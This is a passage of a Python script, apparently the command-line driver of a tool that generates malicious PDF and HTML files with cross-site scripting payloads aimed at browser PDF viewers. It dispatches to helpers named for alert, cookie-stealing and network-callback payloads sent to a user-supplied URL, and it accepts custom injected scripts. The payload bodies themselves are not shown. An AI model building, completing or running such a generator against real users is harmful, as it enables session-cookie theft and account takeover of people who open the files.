        print("Supported Browser Targets:")
        print("=" * 60)
        for browser, config in BROWSER_CONFIGS.items():
            print(f"{browser:8} - {config['name']}")
            print(f"{'':10} {config['description']}")
            print(f"{'':10} Features: {', '.join(config['features'])}")
            print()
        print("Use -b <browser> to target specific browser PDF library")
        sys.exit(0)

    output = args.output.lower()
    url = args.url
    script = args.script
    xss_type = args.xss_type
    browser = args.browser.lower() if args.browser else 'all'

    # Validate URL format if provided
    if url and not (url.startswith('http://') or url.startswith('https://')):
        print(f"Error: Invalid URL format: {url}")
        print("URL must include schema (http:// or https://)")
        sys.exit(1)

    try:
        if output == "pdf":
            if script:
                # Custom script takes precedence
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                browser_suffix = f"_{browser}" if browser != 'all' else ""
                filename = f"xss_custom{browser_suffix}_{timestamp}.pdf"
                create_custom_payload(filename, script, browser)
                print(f"Custom PDF generated for {BROWSER_CONFIGS[browser]['name']}")
                
            elif xss_type:
                # Generate specific type or all types
                if xss_type == 'all':
                    count = generate_all_types(url, browser)
                    print(f"Generated {count} PDF files for {BROWSER_CONFIGS[browser]['name']}")
                else:
                    if generate_by_type(xss_type, url, browser):
                        print(f"Generated {xss_type} payload for {BROWSER_CONFIGS[browser]['name']}")
                    else:
                        sys.exit(1)
            else:
                # Default: generate basic payloads (backward compatibility)
                print(f"Generating basic PDF files for {BROWSER_CONFIGS[browser]['name']}...")
                create_alert_payload("xss_alert_basic.pdf", browser)
                if url:
                    try:
                        create_cookie_payload("xss_cookie_basic.pdf", url, browser)
                        create_network_payload("xss_network_basic.pdf", url, browser)
                    except ValueError as e:
                        print(f"Note: {e}")
                print("Basic PDF files generated. Use -t <type> for specific payloads")
                
        elif output == "html":
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_test_{timestamp}.html"
            create_malhtml(filename)
            print("HTML file generated")

    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
